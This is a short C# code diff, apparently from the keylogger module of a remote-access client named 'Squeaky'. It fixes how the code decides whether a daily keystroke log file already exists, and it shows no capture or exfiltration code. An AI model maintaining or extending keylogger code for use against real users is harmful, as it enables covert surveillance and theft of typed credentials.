@@ -16,7 +16,7 @@ namespace Squeaky.Client.Utilities
         private static StringBuilder LogBuffer = new StringBuilder();
         private static string LastWindowTitle = "";
 
-        private static bool FirstLine = true;
+        private static bool FirstLine;
         private static bool CtrlPressed = false;
 
         public static string LogDir = @"kl\";
@@ -25,13 +25,14 @@ namespace Squeaky.Client.Utilities
         {
             while (true)
             {
+                FirstLine = true;
                 var dateFile = DateTime.Now.ToString("M-d-yyyy");
-
                 foreach (string file in Directory.GetFiles(LogDir))
                 {
                     if (file == LogDir + dateFile)
                     {
                         FirstLine = false;
+                        break;
                     }
                 }
 
